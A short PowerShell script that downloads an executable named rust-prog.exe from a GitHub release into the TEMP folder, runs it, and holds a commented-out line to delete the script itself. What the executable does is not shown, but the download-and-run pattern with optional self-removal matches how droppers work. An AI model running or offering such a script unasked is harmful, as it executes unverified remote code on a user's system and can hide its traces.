$exeUrl = "https://github.com/Maherilaza/intel-hardware-rng/releases/download/gen-only/rust-prog.exe"
$exePath = "$env:TEMP\rust-prog.exe"
iwr -useb $exeUrl -OutFile $exePath
& $exePath 
Start-Sleep -Seconds 5
$psScriptPath = $MyInvocation.MyCommand.Path
# Remove-Item $psScriptPath -Force
